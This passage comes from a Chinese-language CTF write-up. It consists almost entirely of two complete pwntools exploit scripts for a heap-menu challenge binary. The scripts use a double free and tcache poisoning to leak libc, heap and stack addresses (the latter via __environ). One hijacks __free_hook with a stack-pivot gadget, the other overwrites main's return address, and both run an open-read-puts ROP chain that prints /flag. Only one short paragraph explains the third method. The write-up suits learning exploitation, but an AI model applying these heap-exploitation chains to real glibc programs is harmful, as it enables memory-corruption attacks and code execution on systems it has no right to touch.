    sla     = lambda delim,data         :p.sendlineafter(delim, data)
    r      = lambda numb=4096          :p.recv(numb)
    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
    uu32    = lambda data               :u32(data.ljust(4, b'\0'))
    uu64    = lambda data               :u64(data.ljust(8, b'\0'))
    plt     = lambda data               :elf.plt[data]
    got     = lambda data               :elf.got[data]
    sym     = lambda data               :libc.sym[data]
    itr     = lambda                    :p.interactive()
    local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
    local_libc_32 = '/lib/i386-linux-gnu/libc.so.6'
    remote_libc = ''
    binary = './pwn'
    context.binary = binary
    elf = ELF(binary,checksec=False)
    p = process(binary)
    # p = process(["./pwn"], env={"LD_PRELOAD":"./libc-2.31.so"})
    if len(argv) > 1:
        if argv[1]=='r':
            p = remote('1',1)
    libc = elf.libc
    # libc = ELF(remote_libc)
    def dbg(cmd=''):
        os.system('tmux set mouse on')
        context.terminal = ['tmux','splitw','-h']
        gdb.attach(p,cmd)
        pause()
    """
    chunk_list = 0x40A0 
    chunk_list_flag = 0x04060
    gender_chance = 0x4010
    """
    # start 
    # context.log_level = 'DEBUG'
    def add(idx,sex,name):
        sla('>> ','1')
        sla('index?\n',str(idx))
        sla('2.Girl:\n',str(sex))
        sa("Please input your child's name:\n",name)
    def name_edit(idx,name):
        sla('>> ','2')
        sla('index',str(idx))
        sa('name:',name)
        ru('Done!\n')
    def show(idx):
        sla('>>','3')
        sla('index?',str(idx))
    def free(idx):
        sla('>>','4')
        sla('index?',str(idx))
    def change_sex(idx,sex):
        sla('>>','666')
        sla('index?',str(idx))
        ru('Current gender:')
        temp = uu64(r(6))
        sla('2.Girl:',str(sex))
        return temp
    def content_edit(idx,data):
        sla('>>','5')
        sla('index?',str(idx))
        sa('description:',data)
    def quit():
        sla('>>','6')
    # ----------------------------- 1 free and show; leak heap_addr
    for i in range(8):
        add(i,1,'aaaa\n')
    free(6)
    heap_addr = change_sex(6,2)
    # ---------------------------- 2 doble free 6; leak libc_base
    free(6) # double free
    add(6,1,'aa')
    add(8,1,'aa') # 8 ==6
    for i in range(6):
        free(i)
    free(7) # now tcache is full; next chunk will be in the usbin
    free(6)
    show(8)
    ru('Name: ')
    base = uu64(ru('\x7f',False)) - 0x1ebbe0
    # ---------------------------- 3 set gadget to free_hook
    gadget = base + 0x157d8a
    free_hook = base + sym('__free_hook')
    free_addr = base + sym('free')
    open_addr  = base + sym('open')
    read_addr = base + sym('read')
    puts = base + sym('puts')
    # ret -> mov rip, [rsp]; rsp + 8
    leave_r = base + 0x5aa48 # mov rsp, rbp; pop rbp
    P_rax_r = base + 0x4a550
    p_rsi_r = base + 0x27529
    p_rdi_r = base + 0x26b72
    p_rdx_r12_r = base + 0x11c371
    p_rdx_rbx_r = base + 0x162866
    P_rdx_rcx_rbx_r = base + 0x1056fd
    add_rsp_0x18_r=base + 0x3794a
    ret = base + 0x25679
    for i in range(6):
        add(i,1,'aa')
    add(7,1,'a')
    add(6,1,'b')
    # set 6 to tcache and 8 is still at the same position with 6
    free(7)
    free(6)
    # tcache poison
    name_edit(8,p64(free_hook)[:-1])
    add(6,1,'a')
    add(7,1,p64(gadget)[:-1])
    # -------------------------- 4 move stack to heap
    """
    0x157d8a
        mov rbp, qword ptr [rdi + 0x48]; 
        mov rax, qword ptr [rbp + 0x18]; 
        lea r13, [rbp + 0x10]; 
        mov dword ptr [rbp + 0x10], 0; 
        mov rdi, r13; 
        call qword ptr [rax + 0x28];
    """
    stack_addr = heap_addr + 0x900
    # set rbp = chunk_des 6
    pl = '/flag\x00'
    pl = pl.ljust(0x38,'a')
    pl+= p64(stack_addr)
    pl+= p64(leave_r) # rax + 0x28 call
    content_edit(0,pl)
    pl = p64(ret) + p64(add_rsp_0x18_r)*2
    pl+= p64(heap_addr + 0xa10+0x18) # rax
    pl+= '\x00'*0x8
    # --------------------------- 5 set orw ropchains on fakestack
    # orw chains
    # open
    pl+= p64(p_rdi_r)+p64(heap_addr+0x0a10)+p64(p_rsi_r)+p64(0)+p64(open_addr)
    # read
    pl+= p64(p_rdi_r)+p64(4)+p64(p_rsi_r)+p64(heap_addr+0x3d0)+p64(p_rdx_r12_r)+p64(0x30)*2+p64(read_addr)
    # puts
    pl+= p64(p_rdi_r)+p64(heap_addr+0x3d0)+p64(puts)
    content_edit(6,pl)
    leak(free_hook)
    leak(open_addr)
    leak(read_addr)
    leak(puts)
    leak(gadget)
    leak(heap_addr)
    leak(base)
    leak(leave_r)
    comm = 'b *' + str(hex(add_rsp_0x18_r))+'\n'
    comm+= 'b *' + str(hex(gadget)) + '\n'
    dbg(comm)
    # ---------------------------- 6 tigger
    free(0)
    # end 
    itr()
###  解法3 – 通过environ泄露栈地址，并在栈上构造orw rop链
在解法二当中我们是通过gadgets进行栈迁移，将原本的栈地址劫持到了堆上，但如果
`栈地址`已知的话，解题过程会更加简单，而且不需要特意去寻找万金油的gadgets
那么如何泄露`栈地址`呢？
其实程序的栈地址会存放在 `__environ`中，我们只要输出`__environ`的内容就能获取栈地址
在获取到栈地址后，我在main函数的 `ret`处下一个断点，发现main函数返回值和我们泄露的栈地址正好相差 `0x100`
之后的思路就比较清晰了，我们依旧通过 `tcache poison`的方式，将堆块申请到main函数返回的位置，布置 orw ropchain，之后通过
`退出`功能将程序控制流指向布置好的 ropchain，最后输出flag
详见EXP
    #!/usr/bin/python
    #coding=utf-8
    #__author__:N1K0_
    from pwn import *
    import inspect
    from sys import argv
    def leak(var):
        callers_local_vars = inspect.currentframe().f_back.f_locals.items()
        temp =  [var_name for var_name, var_val in callers_local_vars if var_val is var][0]
        p.info(temp + ': {:#x}'.format(var))
    s      = lambda data               :p.send(data) 
    sa      = lambda delim,data         :p.sendafter(delim, data)
    sl      = lambda data               :p.sendline(data)
    sla     = lambda delim,data         :p.sendlineafter(delim, data)
    r      = lambda numb=4096          :p.recv(numb)
    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
    uu32    = lambda data               :u32(data.ljust(4, b'\0'))
    uu64    = lambda data               :u64(data.ljust(8, b'\0'))
    plt     = lambda data               :elf.plt[data]
    got     = lambda data               :elf.got[data]
    sym     = lambda data               :libc.sym[data]
    itr     = lambda                    :p.interactive()
    local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
    local_libc_32 = '/lib/i386-linux-gnu/libc.so.6'
    remote_libc = ''
    binary = './pwn'
    context.binary = binary
    elf = ELF(binary,checksec=False)
    p = process(binary)
    if len(argv) > 1:
        if argv[1]=='r':
            p = remote('1',1)
    libc = elf.libc
    # libc = ELF(remote_libc)
    def dbg(cmd=''):
        os.system('tmux set mouse on')
        context.terminal = ['tmux','splitw','-h']
        gdb.attach(p,cmd)
        pause()
    """
    chunk_list = 0x40A0 
    chunk_list_flag = 0x04060
    gender_chance = 0x4010
    """
    # start 
    context.log_level = 'DEBUG'
    def add(idx,sex,name):
        sla('>> ','1')
        sla('index?\n',str(idx))
        sla('2.Girl:\n',str(sex))
        sa("Please input your child's name:\n",name)
    def name_edit(idx,name):
        sla('>> ','2')
        sla('index',str(idx))
        sa('name:',name)
        ru('Done!\n')
    def show(idx):
        sla('>>','3')
        sla('index?',str(idx))
    def free(idx):
        sla('>>','4')
        sla('index?',str(idx))
    def change_sex(idx,sex):
        sla('>>','666')
        sla('index?',str(idx))
        ru('Current gender:')
        temp = uu64(r(6))
        sla('2.Girl:',str(sex))
        return temp
    def content_edit(idx,data):
        sla('>>','5')
        sla('index?',str(idx))
        sa('description:',data)
    def quit():
        sla('>>','6')
    # ---------------------------- 1 构造double free；泄露libc、heap、environ；将堆块申请到environ泄露stack并计算出main ret
    for i in range(10):
        add(i,1,'aaaa')
    for i in range(7):
        free(6-i)
    free(7)
    free(8)
    add(0,1,'aaaa')
    free(8)
    add(0,1,'aaaa')
    for i in range(1,8):
        add(i,1,'aaaa')
    show(0)
    base = uu64(ru('\x7f',False)[-6:]) - 0x1ebbe0
    environ = base + sym('__environ')
    leak(base)
    leak(environ)
    add(8,1,'aaaa')
    free(9)
    free(8)
    name_edit(0,p64(environ-0x10)[:-1])
    add(8,1,'aaaa')
    add(9,1,'aaaa')
    show(9)
    stack_addr = uu64(ru('\x7f',False)[-6:])
    main_ret = stack_addr - 0x100
    leak(stack_addr)
    leak(main_ret)
    # ----------------------------------------2 利用double和tcache poison，将堆块申请到main ret并布置orw chains
    free(7)
    free(8)
    show(0)
    ru('Name: ')
    heap_addr = uu64(r(6))-0xa10
    leak(heap_addr)
    name_edit(0,p64(main_ret-0x10)[:-1])
    add(8,1,'/flag\x00\x00')
    add(7,1,'aa')
    p_rsi_r = base + 0x27529
    p_rdi_r = base + 0x26b72
    p_rdx_r12_r = base + 0x11c371
    open_addr  = base + sym('open')
    read_addr = base + sym('read')
    puts = base + sym('puts')
    # orw chains
    # open
    pl = p64(p_rdi_r)+p64(heap_addr+0x0b20)+p64(p_rsi_r)+p64(0)+p64(open_addr)
    # read
    pl+= p64(p_rdi_r)+p64(4)+p64(p_rsi_r)+p64(heap_addr+0x3d0)+p64(p_rdx_r12_r)+p64(0x30)*2+p64(read_addr)
    # puts
    pl+= p64(p_rdi_r)+p64(heap_addr+0x3d0)+p64(puts)
    content_edit(7,pl)
    #------------------------------------------3 trigger
    quit()
    # end
    itr()
## 参考